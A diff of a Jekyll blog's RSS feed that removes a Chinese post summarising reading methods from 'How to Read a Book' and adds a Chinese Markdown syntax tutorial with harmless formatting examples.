-&lt;p&gt;&lt;strong&gt;这本书和我有什么关系？&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;我看的书不多，在看过的有限的书当中，大部分书更是看过就遗忘了。这本书其实给我深有感触的不在于很多技巧的规则，而是让我觉得我应该做一个对自己有要求的读者：强烈的主动去阅读、多提问题、去思考去辩论、如果有时间尽量给每本好书留下总结，写下评论。这才是不辜负阅读，增加自己内在生命力量的源动力。这也是也许我这篇总结写的很浅，但会持续尽量写下去的意义。&lt;/p&gt;
-
-&lt;p&gt;期望自己能保持阅读的习惯，保持写作总结的习惯，让自己的心智保持活力与增长。认识内心的自己、不纠结于过去，不惶恐于未来。做一个简单、充实、自我要求、内心强大的自己。&lt;/p&gt;
-
-&lt;h3 id=&quot;部分摘录&quot;&gt;部分摘录&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读的层次：&lt;/strong&gt;基础阅读、检视阅读、分析阅读、主题阅读&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读的自我要求&lt;/strong&gt;，要能从四个问题自己找到答案：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;整体来说，这本书到底在谈些什么？作者怎么从核心主题分解从属主题。&lt;/li&gt;
-  &lt;li&gt;作者细部说了什么？找出想法、声明与论据。&lt;/li&gt;
-  &lt;li&gt;这本书说的有道理吗？是全部有道理还是部分有道理。&lt;/li&gt;
-  &lt;li&gt;这本书跟你有什么关系？&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;检视阅读：&lt;/strong&gt;可以简单理解为略读。&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;第一种方式：有系统的略读，准备了解本书的架构
-    &lt;ol&gt;
-      &lt;li&gt;先看书名页，看序看说明，跟本书相关的介绍都看。这时候可以把书归类，并在那个类型包含了那些书。&lt;/li&gt;
-      &lt;li&gt;研究目录页&lt;/li&gt;
-      &lt;li&gt;检阅索引&lt;/li&gt;
-      &lt;li&gt;如果包含了书页，可以看下出版者的介绍 （到这可以决定是否真正进行略读了）&lt;/li&gt;
-      &lt;li&gt;如果目录比较模块，挑几个跟主题相关的篇章来看，尤其是开头和结尾有摘要说明的部分，要仔细阅读。&lt;/li&gt;
-      &lt;li&gt;东翻翻西翻翻，有时看一两个段落，有时候连续几页，但不要太多。随时寻找主要论点，留意主题的脉络。最重要的不要忽略最后的两三页（通常重述既新又重要的观点）。&lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;第二种方式：粗浅的阅读，了解全书内容
-    &lt;ol&gt;
-      &lt;li&gt;粗浅的阅读，先跳过不懂的地方，继续往下阅读&lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;分析阅读&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;书籍分类的重要性：用不同的方法去阅读不同类型的书籍&lt;/p&gt;
-
-&lt;p&gt;主要分类：虚构的小说类、传达知识，说明性的论述类。而在论述类里，可进一步将历史从哲学中分类出来，也可以将这两者从科学与数学中区分出来。&lt;/p&gt;
-
-&lt;p&gt;实用书籍和理论书籍的区别：实用书籍经常会出现“应该”，“好”，“坏”，“结果”，理论型作品常常说“是”，没有“应该”或“应当”之类的字眼，只讲述事实，不说怎样怎样会更好。&lt;/p&gt;
-
-&lt;p&gt;理论型作品的分类：历史、科学（心理学、几何学、物理学等）和哲学等等。如果一本书的内容，超乎日常、例行、正常生活的经验，那就是科学，否则就是一本哲学的书。科学家会以他特殊经验的结果举证，哲学家却会以人类的共通性作例证。&lt;/p&gt;
-
-&lt;p&gt;分析阅读包含以下过程：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;第一阶段：找出一本书在谈些什么
-    &lt;ol&gt;
-      &lt;li&gt;依照书本的种类与主题作分类。&lt;br /&gt;
- 论术性作品：历史、哲学、科学等。&lt;br /&gt;
- 想象文学作品：抒情诗、小说、戏剧等。&lt;/li&gt;
-      &lt;li&gt;用最简短的句子说出整本书在谈些什么。&lt;br /&gt;
- 论术性作品：作者想要解决什么问题。&lt;br /&gt;
- 想象文学作品：整体情节。&lt;/li&gt;
-      &lt;li&gt;按照顺序与关系，列出全书的重要部分。将全书的纲要拟出来之后，再将各个部分的纲要也一一列出。&lt;br /&gt;
- 论术性作品：部分的架构与整体架构，部分问题的解决与总体解决。&lt;br /&gt;
- 想象文学作品：各阶段角色与事件的细节，故事高潮的各种不同关键是什么，怎么发生的，带来什么结果。&lt;/li&gt;
-      &lt;li&gt;找出作者在问的问题，或作者想要解决的问题。&lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;第二阶段：诠释一本书的内容
-    &lt;ol&gt;
-      &lt;li&gt;与作者找到共通的词语：找到一些关键词，理解作者想表达的准确定义。&lt;/li&gt;
-      &lt;li&gt;从最重要的句子中抓出作者的重要主旨。&lt;/li&gt;
-      &lt;li&gt;找出作者的论述，重新架构这些论述的前因后果，以明白作者的主张。&lt;/li&gt;
-      &lt;li&gt;确定作者已经解决了那些问题，还有那些是未解决的。在未解决的问题中，确定哪些是作者认为自己无法解决的问题。
-与第一阶段一问一答，总结与辩证。&lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-  &lt;li&gt;第三阶段：像是沟通知识一样地评论一本书
-    &lt;ol&gt;
-      &lt;li&gt;除非已经完成大纲架构，也能诠释整本书了，否则不要轻易评论。&lt;/li&gt;
-      &lt;li&gt;不要争强好胜，非辩到底不可。&lt;/li&gt;
-      &lt;li&gt;在说出评论之前，你要能证明自己区别地出真正的知识与个人观点的不同。&lt;/li&gt;
-      &lt;li&gt;证明作者的知识不足。&lt;/li&gt;
-      &lt;li&gt;证明作者的知识错误。&lt;/li&gt;
-      &lt;li&gt;证明作者不合逻辑。&lt;/li&gt;
-      &lt;li&gt;证明作者的分析与理由是不完整的&lt;/li&gt;
-    &lt;/ol&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;三个阶段的三组规则：架构性、诠释性、与评论性。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读故事、戏剧与诗&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;小说、故事、散文、诗、戏剧（悲剧、戏剧、不悲不喜）、抒情诗。&lt;/p&gt;
-
-&lt;p&gt;仍然是4个问题：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;整本书在谈些什么？&lt;/p&gt;
-
-    &lt;p&gt;能说出关于一个故事、戏剧、或诗的情节大意，并要能广泛地包括故事或抒情诗中的动作与变化。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;内容的细节是什么？是如何表现出来的？&lt;/p&gt;
-
-    &lt;p&gt;辨识剧中所有不同的角色，并用自己的话重新叙述过发生在他们身上的关键事件。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;这本书说的是真实的吗？是全部真实还是部分真实？&lt;/p&gt;
-
-    &lt;p&gt;这像一个故事吗？这本书能满足你的心灵与理智吗？你欣赏这本书的美吗？不管是那一种观点，能说出理由吗？&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;这本书与我何关？&lt;/p&gt;
-
-    &lt;p&gt;想象文学基本回答前3个问题就差不多了。但是通常想象文学更容易带动一个观点，吸引读者去做各种各样的事。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读故事书:&lt;/strong&gt; 快读，并且全心全意地读。全心全意进入到角色、故事情节当中。&lt;/p&gt;
-
-&lt;p&gt;批评小说：一种满足个人特殊潜意识需求的小说（例如虐待狂或被虐狂，满足征服或被虐）。&lt;br /&gt;
-另一种是满足大多数人潜意识需求的小说：对正义的信念与领悟，平息心中的焦虑，世界多多少少是美好的等，无疑这一种会是伟大的作品。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读史诗:&lt;/strong&gt; 荷马的《伊利亚特》与《奥德赛》，维吉尔的《埃涅阿斯纪》，但丁的《神曲》，弥尔顿的《失乐园》。再加上《圣经》读书计划不可或缺的读物。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读戏剧:&lt;/strong&gt; 假装看到演出的实景。自导这个剧本。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读抒情诗:&lt;/strong&gt; 抒情诗如果不是赞美就是唤起行动（革命行动）。(1)不论觉得自己动不动，都要一口气读完，了解大意，不要停。(2)重读一遍，大声读出来。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读历史书*:&lt;/strong&gt; (1)对感兴趣的事件或时期，尽可能读一种以上的历史书。(2)阅读历史时，不只要关心在过去某个时间、地点真正发生了什么事，还要读懂在任何时空之中，尤其是现在，人们为什么会有如此这般行动的原因。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;阅读与心智成长&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;好阅读会让你有所技巧成长，更重要的是让你了解这个世界和你自己。&lt;/p&gt;
-
-&lt;p&gt;如果我们没有内在的生命力量，我们的智力、品德与心灵就会停止成长。当我们停止成长时，也就迈向了死亡。好的阅读能帮助我们的心智保持活力与成长。&lt;/p&gt;
-</description>
-        <pubDate>Sat, 24 Jun 2017 22:00:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/06/24/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6-%E6%91%98%E5%BD%95/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/06/24/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6-%E6%91%98%E5%BD%95/</guid>
-        
-        <category>总结</category>
-        
-        
-        <category>reading</category>
         
       </item>
     
@@ -2556,6 +269,350 @@ site.time: 当前运行jekyll的时间&lt;/p&gt;
         <pubDate>Fri, 23 Jun 2017 21:30:01 +0800</pubDate>
         <link>http://localhost:4000/2017/06/23/jekyll/</link>
         <guid isPermaLink="true">http://localhost:4000/2017/06/23/jekyll/</guid>
+        
+        <category>教程</category>
+        
+        
+        <category>document</category>
+        
+      </item>
+    
+      <item>
+        <title>Markdown语法</title>
+        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#段落和换行&quot; id=&quot;markdown-toc-段落和换行&quot;&gt;段落和换行&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#标题&quot; id=&quot;markdown-toc-标题&quot;&gt;标题&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#引用-blockquotes&quot; id=&quot;markdown-toc-引用-blockquotes&quot;&gt;引用 Blockquotes&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#列表&quot; id=&quot;markdown-toc-列表&quot;&gt;列表&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#代码区块&quot; id=&quot;markdown-toc-代码区块&quot;&gt;代码区块&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#分隔线&quot; id=&quot;markdown-toc-分隔线&quot;&gt;分隔线&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#强调&quot; id=&quot;markdown-toc-强调&quot;&gt;强调&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#代码&quot; id=&quot;markdown-toc-代码&quot;&gt;代码&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#链接&quot; id=&quot;markdown-toc-链接&quot;&gt;链接&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#图片&quot; id=&quot;markdown-toc-图片&quot;&gt;图片&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#反斜杠&quot; id=&quot;markdown-toc-反斜杠&quot;&gt;反斜杠&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#html源码&quot; id=&quot;markdown-toc-html源码&quot;&gt;html源码&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;段落和换行&quot;&gt;段落和换行&lt;/h3&gt;
+&lt;p&gt;一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有&lt;strong&gt;一个以上的空行&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;p&gt;如果你确实想要依赖 Markdown 来插入标签的话，在插入处先按入两个以上的空格然后回车。&lt;br /&gt;
+markdown其实更推荐使用列表和Blockquotes达到缩进或换行的效果。&lt;/p&gt;
+
+&lt;h3 id=&quot;标题&quot;&gt;标题&lt;/h3&gt;
+&lt;p&gt;Markdown 支持两种标题的语法，类 Setext 和类 atx 形式。
+类 Setext 形式是用底线的形式，利用 = （最高阶标题）和 - （第二阶标题），例如：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This is an H1
+=============
+
+This is an H2
+-------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;类 Atx 形式则是在行首插入 1 到 6 个 # ，&lt;strong&gt;#后面由空格&lt;/strong&gt;，对应到标题 1 到 6 阶，例如：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 这是 H1
+
+## 这是 H2
+
+###### 这是 H6
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;引用-blockquotes&quot;&gt;引用 Blockquotes&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Blockquotes之间的所有文本都会从常规文本中分离出来，经常会在左、右两边进行缩进（增加外边距），而且有时会使用斜体。也就是说，块引用拥有它们自己的空间。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Blockquotes是在每段第一行前加上&amp;gt;，每段前后加空行。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,
+consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.
+Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.
+&amp;gt;
+&amp;gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse
+id sem consectetuer libero luctus adipiscing.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;效果如下（左侧边框做了自定义样式调整）：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,
+consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.
+Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&lt;/p&gt;
+
+  &lt;p&gt;Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse
+id sem consectetuer libero luctus adipiscing.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;列表&quot;&gt;列表&lt;/h3&gt;
+&lt;p&gt;无序列表使用星号、加号或是减号作为列表标记：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;* Red
+* Green
+* Blue
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;用 + 或 - 代替 * 也是一样效果&lt;/p&gt;
+
+&lt;p&gt;效果如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Red&lt;/li&gt;
+  &lt;li&gt;Green&lt;/li&gt;
+  &lt;li&gt;Blue&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;有序列表则使用数字接着一个英文句点：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Bird
+2. McHale
+3. Parish
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;效果如下：&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Bird&lt;/li&gt;
+  &lt;li&gt;McHale&lt;/li&gt;
+  &lt;li&gt;Parish&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;代码区块&quot;&gt;代码区块&lt;/h3&gt;
+&lt;p&gt;要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Here is an example of AppleScript:
+
+    tell application &quot;Foo&quot;
+        beep
+    end tell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;代码区块会一直延续到没有缩进的文本为止。使用粘贴源码 + 编辑器的tab自动缩进方式，能非常快速的展示源码。&lt;/p&gt;
+
+&lt;p&gt;另一种方式是使用三个或以上反引号，如下书写：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```
+Here is an example of AppleScript:
+
+    tell application &quot;Foo&quot;
+        beep
+    end tell
+```
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;也会产生代码区块，在代码区块内容里有特殊符号例如Markdown符号例如 * 时，一些编辑器会对后面非代码区的文本进行高亮显示。用这种方式可以避免这种错误的高亮显示。&lt;/p&gt;
+
+&lt;h3 id=&quot;分隔线&quot;&gt;分隔线&lt;/h3&gt;
+
+&lt;p&gt;用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;* * *
+
+***
+
+*****
+
+- - -
+
+---------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;强调&quot;&gt;强调&lt;/h3&gt;
+&lt;p&gt;Markdown 使用星号（ * ）和底线（ _ ）作为标记强调字词的符号，如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*single asterisks*
+
+_single underscores_
+
+**double asterisks**
+
+__double underscores__
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;分别显示效果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;single asterisks&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;single underscores&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;double asterisks&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;double underscores&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;但是如果&lt;strong&gt;* 和 _ 两边都有空白的话，它们就只会被当成普通的符号&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;代码&quot;&gt;代码&lt;/h3&gt;
+&lt;p&gt;如果要标记一小段行内代码，你可以用反引号把它包起来，例如：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Use the `printf()` function.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;效果如下:
+Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;h3 id=&quot;链接&quot;&gt;链接&lt;/h3&gt;
+&lt;p&gt;Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。&lt;/p&gt;
+
+&lt;p&gt;不管是哪一种，链接文字都是用 [方括号] 来标记。&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;行内式的链接：&lt;/em&gt; 只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This is [an example](http://example.com/ &quot;Title&quot;) inline link.
+
+[This link](http://example.net/) has no title attribute.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;效果如下：
+This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;an example&lt;/a&gt; inline link.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has no title attribute.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;参考式的链接&lt;/em&gt; 是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;This is [an example][id] reference-style link.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;接着，在文件的任意处，你可以把这个标记的链接内容定义出来：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[id]: http://example.com/  &quot;Optional Title Here&quot;
+链接内容定义的形式为：
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;接着一个冒号&lt;/li&gt;
+  &lt;li&gt;接着一个以上的空格或制表符&lt;/li&gt;
+  &lt;li&gt;接着链接的网址&lt;/li&gt;
+  &lt;li&gt;可选的 title 内容，可以用单引号、双引号或是括弧包着&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;网址定义只有在产生链接的时候用到，并不会直接出现在文件之中。&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;隐式链接&lt;/em&gt; 可以省略指定链接标记，这种情形下，链接文字会当作链接标记，要用隐式链接标记只要在链接文字后面加上一个空的方括号&lt;/p&gt;
+
+&lt;p&gt;下面是一个参考式链接的范例：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I get 10 times more traffic from [Google] [1] than from
+[Yahoo] [2] or [MSN] [3].
+
+[1]: http://google.com/        &quot;Google&quot;
+[2]: http://search.yahoo.com/  &quot;Yahoo Search&quot;
+[3]: http://search.msn.com/    &quot;MSN Search&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;如果改成用链接名称的方式写：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I get 10 times more traffic from [Google][] than from
+[Yahoo][] or [MSN][].
+
+[google]: http://google.com/        &quot;Google&quot;
+[yahoo]:  http://search.yahoo.com/  &quot;Yahoo Search&quot;
+[msn]:    http://search.msn.com/    &quot;MSN Search&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;效果如下：&lt;/p&gt;
+
+&lt;p&gt;I get 10 times more traffic from &lt;a href=&quot;http://google.com/&quot; title=&quot;Google&quot;&gt;Google&lt;/a&gt; than from
+&lt;a href=&quot;http://search.yahoo.com/&quot; title=&quot;Yahoo Search&quot;&gt;Yahoo&lt;/a&gt; or &lt;a href=&quot;http://search.msn.com/&quot; title=&quot;MSN Search&quot;&gt;MSN&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;图片&quot;&gt;图片&lt;/h3&gt;
+&lt;p&gt;Markdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： 行内式和参考式。&lt;/p&gt;
+
+&lt;p&gt;行内式的图片语法看起来像是：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;![Alt text](/path/to/img.jpg)
+
+![Alt text](/path/to/img.jpg &quot;Optional title&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;参考式的图片语法则长得像这样：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;![Alt text][id]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;除了多了感叹号，其他参考链接语法规则。&lt;/p&gt;
+
+&lt;p&gt;到目前为止， Markdown 还没有办法指定图片的宽高，如果你需要的话，你可以使用html的img标签。&lt;/p&gt;
+
+&lt;h3 id=&quot;反斜杠&quot;&gt;反斜杠&lt;/h3&gt;
+&lt;p&gt;Markdown 可以利用反斜杠来插入一些在语法中有其它意义的符号，即对有特殊意义的符号进行转义。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\   反斜线
+`   反引号
+*   星号
+_   底线
+{}  花括号
+[]  方括号
+()  括弧
+#   井字号
++   加号
+-   减号
+.   英文句点
+!   惊叹号
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;tip: 花括号在模板代码里面会使用&lt;/p&gt;
+
+&lt;h3 id=&quot;html源码&quot;&gt;html源码&lt;/h3&gt;
+
+&lt;p&gt;可以在Markdown里书写html源码，已满足比较自由格式的内容显示。例如，在 Markdown 文件里加上一段 HTML 表格：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;table&amp;gt;
+    &amp;lt;tr&amp;gt;
+        &amp;lt;td&amp;gt;Food1&amp;lt;/td&amp;gt;
+        &amp;lt;td&amp;gt;Food2&amp;lt;/td&amp;gt;
+    &amp;lt;/tr&amp;gt;
+    &amp;lt;tr&amp;gt;
+        &amp;lt;td&amp;gt;Water1&amp;lt;/td&amp;gt;
+        &amp;lt;td&amp;gt;Water2&amp;lt;/td&amp;gt;
+    &amp;lt;/tr&amp;gt;
+&amp;lt;/table&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;显示如下：&lt;/p&gt;
+&lt;table&gt;
+    &lt;tr&gt;
+        &lt;td&gt;Food1&lt;/td&gt;
+        &lt;td&gt;Food2&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+        &lt;td&gt;Water1&lt;/td&gt;
+        &lt;td&gt;Water2&lt;/td&gt;
+    &lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;p&gt;要制约的只有一些 HTML 区块元素――比如 &amp;lt;div&amp;gt;、&amp;lt;table&amp;gt;、&amp;lt;pre&amp;gt;、&amp;lt;p&amp;gt; 等标签，&lt;strong&gt;必须在前后加上空行与其它内容区隔开，还要求它们的开始标签与结尾标签不能用制表符或空格来缩进&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;p&gt;HTML 的行内标签如 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;span&amp;gt;&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;cite&amp;gt;&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;del&amp;gt;&lt;/code&gt; 可以在 Markdown 的段落、列表或是标题里随意使用。举例说明：如果比较喜欢 HTML 的 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img&amp;gt;&lt;/code&gt; 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图像标签语法。&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;本文内容參考 &lt;a href=&quot;http://www.appinn.com/markdown&quot;&gt;Markdown 语法说明(简体中文版)&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 22 Jun 2017 21:09:01 +0800</pubDate>
+        <link>http://localhost:4000/2017/06/22/markdown/</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/06/22/markdown/</guid>
         
         <category>教程</category>
         
